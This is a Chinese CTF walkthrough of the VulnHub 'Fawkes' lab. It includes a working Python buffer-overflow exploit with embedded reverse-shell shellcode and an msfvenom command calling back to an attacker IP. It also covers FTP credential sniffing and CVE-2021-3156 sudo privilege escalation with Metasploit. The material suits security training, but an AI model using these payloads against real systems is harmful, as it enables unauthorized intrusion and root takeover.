# 相关信息

---

kali：10.0.0.9/24

靶机：10.0.0.13/24

靶机介绍：[HarryPotter: Fawkes ~ VulnHub](https://www.vulnhub.com/entry/harrypotter-fawkes,686/)

靶机下载：https://download.vulnhub.com/harrypotter/Fawkes.ova

目标：`3`个 `flag` + `2`个`root`权限

难度：高

# 文字思路

---

## 全流程思路：

-    主机发现	端口扫描
-    WEB信息搜集：这个靶机上的`web`基本搜集不到相关信息，无论是路寄爬取，源码等等。直接让我们的目光只能转向其他端口服务
-    FTP服务攻击	
-    缓冲区溢出	模糊测试	漏洞代码利用编写（统一为缓冲区溢出测试）：
-    流量转包分析	
-    堆溢出漏洞攻击	Metasploit(MSF)	手动修复EXP代码	本地提权（都是给予同一个漏洞操作

## 下意识的操作

1. 任何一个不熟，或者无法识别的端口都应该尝试进行 `nc ip port`来尝试连接，来获取相关的信息。
1. 一定一定在使用任何`payload`，`exp`时都要对其进行阅读，很多时候漏洞利用失败就是因为简单的几个变量问题。
1. 在进行缓冲区溢出漏洞测试的时候一定要关闭测试主机的 `ASLR`功能。

## 主要的知识点

> 参考资料：
>
> - [CVE-2021-3156: Heap-Based Buffer Overflow in Sudo (Baron Samedit) | Qualys Security Blog](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)
> - [GitHub - worawit/CVE-2021-3156: Sudo Baron Samedit Exploit](https://github.com/worawit/CVE-2021-3156)

- 在进行本地的缓冲区溢出测试时，首先 记得关闭`kali`本机的 `ASLR`功能来确保程序每次的启动地址相同。
- `CVE-2021-3156`漏洞的判断和利用
- `msf`中`session`模块的使用

# 具体流程

---

## 信息搜集

1. 主机发现，端口扫描，版本确认。确认开放了`ftp, web, ssh`等服务，比较奇怪的是`22, 2222`两个端口开放的都是`ssh`服务，而且两者的`openssh`版本并不相同。然后`ftp`服务是允许进行匿名的登陆，并且其中是有个`server_hogwarts`文件的。

   <img src="https://image.cchl.fun/kali_image/image-20230724152152484.png" alt="image-20230724152152484" style="zoom:50%;" />

   开放的`9898`端口目标`nmap`无法识别，但`nmap`能探测端口大致的交互内容：欢迎来到霍格沃兹学校，告诉我你要学习的魔法，下面是魔法的清单：1，漂浮咒	2，荧光闪烁......

   <img src="https://image.cchl.fun/kali_image/image-20230724152227070.png" alt="image-20230724152227070" style="zoom:50%;" />

2. 根据`ftp:vsftpd 3.0.3`的版本信息，不难发现只有拒绝服务的漏洞，没有帮助突破边界的相关漏洞。

   ![image-20230724152718395](https://image.cchl.fun/kali_image/image-20230724152718395.png)

3. 访问其`web：80`一无所获，单纯的是个图片网站，源码也是个`html`的静态网站，没有太大的意义。

   <img src="https://image.cchl.fun/kali_image/Snipaste_2023-07-24_15-32-34.png" alt="Snipaste_2023-07-24_15-32-34" style="zoom: 25%;" />

4. 对其进行`dirsearch`目录爬取，无论是使用其他`web`路径发现工具还是更换字典，都是没有新路径的发现。

   <img src="https://image.cchl.fun/kali_image/Snipaste_2023-07-24_15-33-09.png" alt="Snipaste_2023-07-24_15-33-09" style="zoom: 33%;" />

5. 既然`web`没有思路，所以转达对`ftp：21`的测试。匿名登陆`ftp ： anonymous`，输入空的密码，查看`ftp`中的文件，将其`dump`下来进行查看。（进行 `../`等简单的跳出尝试也是无法成功的）

   <img src="https://image.cchl.fun/kali_image/image-20230724154325400.png" alt="image-20230724154324640" style="zoom: 33%;" />

## 缓冲区溢出漏洞测试

1. 不难发现`server_hogwarts`是个`ELF`(`linux`中的执行文件)，对其赋予权限执行后执行，发现光标停止没有进一步动作。

   ![image-20230724154644156](https://image.cchl.fun/kali_image/image-20230724154644156.png)

2. 对`kali`本机进程和打开端口的查看，发现`server_hogwarts`程序在后台运行的同时还开启了`9898`号端口来提供服务，基本可以确定和靶机上的`9898`运行的是同一个程序。

   ![image-20230724155507920](https://image.cchl.fun/kali_image/image-20230724155507920.png)

3. 通过`nc`连接`kali`的开的`9898`端口，可以发现就是个简单的交互程序。你选择个魔法就会有对应的文字反馈。这个非常符合缓冲区溢出漏洞的产生条件，对其进行缓冲区溢出漏洞的测试就显得非常有必要。

   <img src="https://image.cchl.fun/kali_image/image-20230724160624346.png" alt="image-20230724160624346" style="zoom:50%;" />

4. 在进行程序缓冲区测试的时候，需要现关闭`kali`上的`ASLR`功能，修改对应的配置文件就可以了，==非常非常重要的一步，任何缓冲区溢出漏洞的本地测试都需要关闭这个功能。==                                     [==ASLR相关解释==](#back1)<a id='tag1'></a>

   <img src="https://image.cchl.fun/kali_image/image-20230724160459358.png" alt="image-20230724160459358" style="zoom: 67%;" />

5. `apt install deb-bebugger`安装这个图形化程序调试工具，打开后点击`attach`功能，通过关键字选择已经跑起来的程序`server_hogwarts`（前提`kali`已经启动了`server_hogwarts`程序），点击开始按钮:arrow_forward:运行。

   [==相关简单介绍==](#back10)<a id='tag10'></a>

   <img src="https://image.cchl.fun/kali_image/image-20230724163817910.png" alt="image-20230724163817910" style="zoom:67%;" />

6. 然后使用`nc`连接注入`500`个`A`，可以发现目标程序崩溃。而且不仅`EIP`被`AAA`覆盖，同时`ESP`也被成功溢出改写。

   ==注意：建议每次在程序崩溃，需要再次对其进行测试的时候，都将server_hogwarts彻底关闭重新启动一次。==

   <img src="https://image.cchl.fun/kali_image/image-20230724165138459.png" alt="image-20230724165138459" style="zoom:50%;" />

7. 通过`msf-pattern_create`生成`500`个特征字符串，再次重复溢出操作来确认每个 覆盖开始的偏移量。其中`EIP`感染为 `39664138`，再利用`msf`模块中的`offset`工具确定`EIP`为`112`的偏移量。

   [==create工具介绍==](#back2)<a id='tag2'></a>[==offset工具介绍==](#back3)<a id='tag3'></a>

   ![image-20230724180326790](https://image.cchl.fun/kali_image/image-20230724180326790.png)

8. 通过`python`脚本来构造特殊的脚本来使用构造的特殊字符串来连接`9898`端口。调试程序提示`server_hogwarts`出现错误。

   ```python
   #!/usr/bin/python
   import sys,socket
   payload = b'A'*112 + b'B'*4 + b'C'*32	# send函数发现的字符串需要为字节流，所以需要加上b，否则程序或报错
   try:
       s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
       s.connect(('127.0.0.1', 9898))
       s.send((payload))
       s.close()
   except:
       print("Wrong!")
       sys.exit()
   ```

   报错弹窗提示，如果想进一步查看他的情况请按`F7,F8,F9`来查看。其实你可以再次点击:arrow_forward:让程序在报错的前提下继续运行，因为这个弹窗只是提示你`server_hogwarts`出现了故障但是并不代表其不能继续运行。

   <img src="https://image.cchl.fun/kali_image/image-20230724194650065.png" alt="image-20230724194650065" style="zoom:50%;" />

   强制执行后发现`EIP`确实被感染为`BBBB`，而且`ESP`也被`C`感染。那么后续的`C`其实完全可以被替代为恶意代码。（至于为什么`ESP`刚好在`EIP`后面，可以依然通过`msf-pattern_offset`来确认）

   <img src="https://image.cchl.fun/kali_image/image-20230724194930791.png" alt="image-20230724194930791" style="zoom:67%;" />

9. 那么完全可以让`ESP`中的代码内容为一个恶意的反弹`shell`的命令，然后让`EIP`为一个地址固定的`JUMP ESP`命令的地址。让`EIP`无论在什么环境下都能够通过一个地址固定固定的`JUMP ESP`跳转到`ESP`。从而让程序不按程序原有的执行逻辑，而是来执行有恶意代码的`ESP`。

   - `EIP`的`JUMP ESP`的查找：

      选择`deb-bebugger`插件功能中的`OpcodeSearcher`功能，来帮助查找`JUMP ESP`。

      <img src="https://image.cchl.fun/kali_image/image-20230724195400277.png" alt="image-20230724195400277" style="zoom: 67%;" />

      选择 `ESP->EIP`则个选项，点击 `Find`既可以读也可以执行的其地址为 `0x08049d55`。由于`EIP`是要执行 `JUMP ESP`命令的，所以必须要有能够执行的。

      <img src="https://image.cchl.fun/kali_image/Snipaste_2023-07-24_20-04-23.png" alt="Snipaste_2023-07-24_20-04-23" style="zoom:67%;" />

   - `ESP`恶意代码的产生：

      同样使用`msf`中的工具`msfvenom`，来生成一个恶意字符串。值得注意的是这里的坏字符只有 `\x00`，一般的程序有多个坏字符需要你一个一个的进行测试。

      [==命令和工具的介绍==](#tag9)<a id='back9'></a>

      <img src="https://image.cchl.fun/kali_image/image-20230724201622145.png" alt="image-20230724201622145" style="zoom:50%;" />

   10. 将上一步获取的 `EIP, ESP`的具体载荷加入脚本中，先在本机进行测试。可以成功的反弹`shell`

       ```python
       #! /usr/bin/python
       import sys,socket
       buf =  b""
       buf += b"\xba\x56\x8d\x34\x62\xda\xd3\xd9\x74\x24\xf4\x5e"
       buf += b"\x2b\xc9\xb1\x12\x31\x56\x12\x03\x56\x12\x83\xb8"
       buf += b"\x71\xd6\x97\x75\x51\xe0\xbb\x26\x26\x5c\x56\xca"
       buf += b"\x21\x83\x16\xac\xfc\xc4\xc4\x69\x4f\xfb\x27\x09"
       buf += b"\xe6\x7d\x41\x61\xf3\x7d\xb1\x78\x6b\x7c\xb1\x6b"
       buf += b"\x37\x09\x50\x3b\xa1\x59\xc2\x68\x9d\x59\x6d\x6f"
       buf += b"\x2c\xdd\x3f\x07\xc1\xf1\xcc\xbf\x75\x21\x1c\x5d"
       buf += b"\xef\xb4\x81\xf3\xbc\x4f\xa4\x43\x49\x9d\xa7"
       payload = b'A'*112 + b'\x55\x9d\x04\x08' + b'\x90'*32  + buf
       """
       这里需要注意三点：
       	1，EIP的注入位置的JUMP ESP的地址需要进行字节的颠倒，因为靶机为小端。这个细节非常非常重要，只要是缓冲区溢出漏洞都需要注意这一点
       	2，'\x90'的添加，为了防止恶意代码举例ESP起始位置太近导致的执行异常，一般添加该字节来让CPU划过该命令
       	3，都要用b''二进制来显示
       """
       try:
           s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
           s.connect(('127.0.0.1', 9898))
           s.send((payload))
           s.close()
       except:
           print("Wrong!")
           sys.exit()
       ```

       ![image-20230724201546955](https://image.cchl.fun/kali_image/image-20230724201546955.png)

   11. 需改 ` s.connect(('10.0.0.13', 9898))`为靶机`ip`后，再次执行脚本就可以成功的反弹`shell`，突破边界。

       <img src="https://image.cchl.fun/kali_image/image-20230724202142047.png" alt="image-20230724202142047" style="zoom:50%;" />

## 信息搜集

1. 简单的升级`shell`，和查看本地文件发现 `.mycreds.txt`这个非常敏感的文件命名：我的认证。使用`ssh`对`22，2222`两个端口进行登陆发现成功的登陆：`harry : HarrYp0tter@Hogwarts123 `。

   <img src="https://image.cchl.fun/kali_image/image-20230724202504266.png" alt="image-20230724202504266" style="zoom:50%;" />

2. 是`ssh`的交互界面进行信息搜集时发现我们突破边界的`shell`很有可能是个`docker`容器，通过：

   - `ip a`查看靶机的地址与`nmap`发现的不符
   - 主目录 `/`有 `.dockerenv`文件

   这两点基本可以确定拿到的`shell`为一个容器的`shell`。

   <img src="https://image.cchl.fun/kali_image/image-20230724202738544.png" alt="image-20230724202738544" style="zoom: 50%;" />

## 容器内提权

1. 容器内的`harry`账户可以无密码的`sudo`使用任意命令，所以提权非常简单，自接`sudo`一个高权限的`shell`即可。

   <img src="https://image.cchl.fun/kali_image/image-20230724203758029.png" alt="image-20230724203758029" style="zoom:50%;" />

## 信息收集

1. 进入`docker`的`root`目录，获取第一个`flag`。同时查看作者的`note.txt`提示：有人恶意的连接我们的`ftp`服务，你可以分析一下流量来找出到底是谁在连接我们。

   <img src="https://image.cchl.fun/kali_image/Snipaste_2023-07-24_20-49-16.png" alt="Snipaste_2023-07-24_20-49-16" style="zoom: 67%;" />

   这个`flag`符合`base64`的基本特征，可以进行解密：哈利波特被伏地魔打败。

   ![Snipaste_2023-07-24_20-45-24](https://image.cchl.fun/kali_image/Snipaste_2023-07-24_20-45-24.png)

2. 由于是靶机环境，键入`linux`自带的流量抓取命令`tcpdump -i eth0 port 21`来对`eth0`网卡 `21：ftp`端口的流量进行分析。在抓取一段时间后可以截获下面的数据包，由于是`ftp`是明文协议可以简单的获取一个用户密码：`neville ：bL!Bsg3k`。

   [==tcpdump解析==](#tag7)<a id='back7'></a>

   ```python
   tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
   listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
   19:46:01.902624 IP 172.17.0.1.36976 > 2b1599256ca6.21: Flags [.], ack 21, win 502, options [nop,nop,TS val 3417513342 ecr 720587052], length 0
   19:46:01.902666 IP 172.17.0.1.36976 > 2b1599256ca6.21: Flags [P.], seq 1:15, ack 21, win 502, options [nop,nop,TS val 3417513342 ecr 720587052], length 14: FTP: USER neville
   19:46:01.902668 IP 2b1599256ca6.21 > 172.17.0.1.36976: Flags [.], ack 15, win 510, options [nop,nop,TS val 720587053 ecr 3417513342], length 0
   19:46:01.902687 IP 2b1599256ca6.21 > 172.17.0.1.36976: Flags [P.], seq 21:55, ack 15, win 510, options [nop,nop,TS val 720587053 ecr 3417513342], length 34: FTP: 331 Please specify the password.
   19:46:01.902704 IP 172.17.0.1.36976 > 2b1599256ca6.21: Flags [P.], seq 15:30, ack 55, win 502, options [nop,nop,TS val 3417513342 ecr 720587053], length 15: FTP: PASS bL!Bsg3k
   ```

## 突破docker容器/提权

1. 使用`ftp`明文中获取的`neville ：bL!Bsg3k`尝试进行`ssh`登陆可以发现能够成功进入真实的靶机。

   <img src="https://image.cchl.fun/kali_image/Snipaste_2023-07-24_20-57-08.png" alt="Snipaste_2023-07-24_20-57-08" style="zoom:50%;" />

2. 通过查看`sudo`命令的版本：`1.8.27`和靶机的发行版本`Debian:10`，符合下面文章中的利用条件可以发现这个靶机具有`sudo`的提取相关漏洞，下面两个链接有详细的说明：

   - [CVE-2021-3156: Heap-Based Buffer Overflow in Sudo (Baron Samedit) | Qualys Security Blog](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)

      <img src="https://image.cchl.fun/kali_image/image-20230801131033245.png" alt="image-20230801131033245" style="zoom:50%;" />

      通过执行这个命令还可以确定靶机是否一定可以使用该`CVE`漏洞，明显靶机上是具有该漏洞的。

      ![image-20230801131823378](https://image.cchl.fun/kali_image/image-20230801131823378.png)

   <img src="https://image.cchl.fun/kali_image/Snipaste_2023-07-24_21-05-35.png" alt="Snipaste_2023-07-24_21-05-35" style="zoom:50%;" />

3. 具体的利用代码为下面的托管的文件，需要注意的是需要对其中`sudo`命令文件的位置进行修改才能正常执行

   [GitHub - worawit/CVE-2021-3156: Sudo Baron Samedit Exploit](https://github.com/worawit/CVE-2021-3156)

   <img src="https://image.cchl.fun/kali_image/Snipaste_2023-07-25_07-37-10.png" alt="Snipaste_2023-07-25_07-37-10" style="zoom: 50%;" />

   - 确定靶机上`sudo`命令的位置：

      <img src="https://image.cchl.fun/kali_image/Snipaste_2023-07-25_07-40-39.png" alt="Snipaste_2023-07-25_07-40-39" style="zoom: 67%;" />

   - 修改`exploit_nss.py`中`sudo`命令的位置：

      <img src="https://image.cchl.fun/kali_image/Snipaste_2023-07-25_07-41-41.png" alt="Snipaste_2023-07-25_07-41-41" style="zoom: 67%;" />

   - 通过python开启`http`服务，上载该`exp`，执行后即可提示为`root`用户：

      <img src="https://image.cchl.fun/kali_image/Snipaste_2023-07-25_07-46-44.png" alt="Snipaste_2023-07-25_07-46-44" style="zoom:50%;" />

   - 查看剩下的两个`flag`，完成打靶：

      <img src="https://image.cchl.fun/kali_image/Snipaste_2023-07-25_07-49-50.png" alt="Snipaste_2023-07-25_07-49-50" style="zoom:50%;" />

      <img src="https://image.cchl.fun/kali_image/Snipaste_2023-07-25_07-50-49.png" alt="Snipaste_2023-07-25_07-50-49" style="zoom: 50%;" />

# 相关工具/命令

---

## 命令

### tcpdump

1. what?															[==返回==](#back7)<a id='tag7'></a>

   是一个在 Linux 系统中常用的网络抓包工具。它允许用户捕获和分析网络数据包，并提供了对网络流量的详细视图，对于网络故障排除、网络安全分析和网络协议研究非常有用。

2. how to use?

   1. `sudo tcpdump -i eth0`：捕获指定网络接口的所有数据包
      - `-i <interface>`：指定要抓取数据包的网络接口。
   2. `sudo tcpdump port 80`：捕获指定端口号的数据包
      - `port 80`: 是一个过滤表达式，用于指定抓取目标端口号为 `80` 的数据包。

## 工具

### edb-debugger

1. what?											[==返回==](#tag10)<a id='back10'></a>

   `edb-debugger` 是一个开源的、图形化的调试器工具，全称为 "Evan's Debugger"。它是用于Linux和Windows操作系统的调试器，专为逆向工程、漏洞分析和开发者调试任务而设计。

   主要特点和功能包括：

   - 多平台支持：可以在Linux和Windows上运行，提供跨平台的调试能力。

   - 图形化界面：提供直观的图形用户界面，方便用户进行调试操作。

   - 汇编级调试：支持汇编级调试，允许用户单步执行代码、查看寄存器和内存等信息。

   - 多种体系结构支持：可以调试多种体系结构的程序，如x86、x86-64、ARM等。

   - 代码分析：提供反汇编功能，允许用户查看程序的反汇编代码。

   - 插件支持：支持插件扩展，用户可以根据需要添加自定义插件来增强功能。

   - 脚本支持：支持Python脚本编写，用户可以编写脚本来自动化调试任务。

### msf-pattern_create

1. what？											[==返回==](#tag2)<a id='back2'></a>

   在Metasploit中，`msf-pattern_create`是一个用于生成模式字符串（pattern string）的工具。这个模式字符串主要用于在漏洞利用开发中定位内存溢出漏洞的位置和确定偏移量。漏洞利用中的偏移量是指在发生内存溢出时，目标程序中的特定位置距离缓冲区开头的偏移量。

2. how to use?

   - `-l, --length LENGTH`: 指定生成的模式字符串的长度。

      ```python
      msf-pattern_create -l 100
      ```

   - `-s, --sets SETS`: 指定用于生成模式字符串的字符集，可以从预定义的字符集中选择。
   - `-r, --repeat COUNT`: 指定重复模式字符串的次数。
   - `-c, --consecutive`: 生成连续的模式字符串字符集。
   - `-p, --padded LENGTH`: 用字符"A"将生成的模式字符串填充到指定长度。
   - `-f, --format FORMAT`: 指定输出的格式，可以选择原始格式或其他编程语言的格式，比如Ruby、Python、C等

### msf-pattern_offset

1. what？											[==返回==](#tag3)<a id='back3'></a>

   用于在漏洞利用开发过程中帮助确定程序中特定字符模式的偏移量。这个工具主要用于辅助在缓冲区溢出等漏洞利用中定位返回地址或其他关键数据在缓冲区中的位置。

2. how to use?

   1. `-q`, `--query <VALUE>`：必需参数，用于指定要查找偏移量的特定字符模式。通常是由"msf-pattern_create"生成的字符串。 
   2. `-l`, `--length <VALUE>`：可选参数，用于指定要搜索的模式的最大长度。默认情况下，搜索整个输入字符串。
   3. `-s`, `--sets <VALUE>`：可选参数，用于指定要使用的字符集。默认为"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"。
   4. `-i`, `--iterations <VALUE>`：可选参数，用于指定在搜索模式时要执行的迭代次数。默认为1。
   5. `-v`, `--var-name <VALUE>`：可选参数，用于指定结果偏移量的变量名。默认为"offset"。
   6. `--nooffset`：可选参数，如果指定此标志，将不会输出偏移量值，仅输出调试信息。
   
   ### msfvenom
   
   1. what?										[==返回==](#back9)<a id='tag9'></a>
   
      是Metasploit框架中的一个强大的渗透测试工具，用于生成各种类型的恶意代码，如shellcode、payloads和exploits。Metasploit是一款开源的渗透测试框架，旨在帮助安全专业人员评估和测试系统，发现安全漏洞，并验证安全防御措施。
   
      Msfvenom可以根据用户的需求定制恶意代码，以便在渗透测试或漏洞利用过程中使用。它支持生成多种平台和架构下的payloads，包括但不限于Windows、Linux、Android、iOS等。
   
   2. 具体使用
   
      1. `msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.9 LPORT=4444 -b "\x00" -f py`
   
         - `-p`：用于指定`payload`的具体类型为一个`linux`中的一个`tcp`的反弹`shell`。至于其他系统，其他功能的`payload`自行搜索。
   
         - `-b`：提示在生成的`shellcode`中应该避免的字符，一般为坏字符。
   
         - `-f`：用于指定`shellcode`的输出格式
   
            > 综上所述，这个命令的含义是生成一个适用于Linux x86架构的反向TCP Shellcode，连接回10.0.0.9的IP地址和4444端口，并避免生成的Shellcode包含空字符。输出格式为Python格式，方便在Python脚本中使用。生成的payload可以用于渗透测试和利用目标系统的漏洞。

# 相关payload

---

### CVE-2021-3156

1. 相关的`exp`托管：[GitHub - worawit/CVE-2021-3156: Sudo Baron Samedit Exploit](https://github.com/worawit/CVE-2021-3156)
2. 使用其中的 `exploit_nss.py`脚本，只需修改`exp`中`sudo`命令的地址即可。

# 复盘/相关知识

---

## 复盘

### msf进行CVE-2021-3156突破

1. 可以看出`msf`已经收录这个漏洞的相关利用模块，对模块进行调用。

   ![image-20230724210801882](https://image.cchl.fun/kali_image/image-20230724210801882.png)

2. 可以看到该模块是需要建立一个`session`连接的。

   ![image-20230724211516030](https://image.cchl.fun/kali_image/image-20230724211516030.png)

3. 由于我们知道`ssh`登陆的用户和密码，可以`use auxiliary/scanner/ssh/ssh_login`这个模块来建立`session`。对其进行相关参数的设置，然后`run`建立链接。 

   ![Snipaste_2023-07-24_21-13-50](https://image.cchl.fun/kali_image/Snipaste_2023-07-24_21-13-50.png)

4. 再次转到`exp`的利用模块，然后使用`show sessions`来查看我们建立了哪些链接，进而对`exp`中的`session`参数进行设置。但是我们也知道在靶机上的`sudo`命令位置不是一般的存放位置，而`exp`的利用模块又没有给我们这个选项，所以最后结果自然是利用失败。

   ![image-20230725073354374](https://image.cchl.fun/kali_image/image-20230725073354374.png)

## 重要 

### ASLP

1.  what？																[==返回==](#tag1)<a id='back1'></a>

   "地址空间布局随机化"（`Address Space Layout Randomization`，简称`ASLR`）。它是一种计算机安全技术，用于增加系统的安全性，特别是防止内存相关的攻击，如缓冲区溢出攻击。

   `ASLR`通过在每次启动进程时，随机化将其代码、数据、堆栈等部分加载到内存的位置，使得攻击者很难预测正确的内存地址来进行攻击。这种随机化大大降低了攻击者利用固定内存地址进行攻击的可能性，因为每次启动进程时，地址空间的布局都会发生变化。

   这样即使目标程序存在相关缓冲区溢出漏洞，但是由于这个机制也可以让其具有一定的安全性。

2. 如何控制？

   由这个文件`/proc/sys/kernel/randomize_va_space`内的参数控制，`2`为开启`ASLP`功能，`0`为`ASLP`关闭，修改即可。

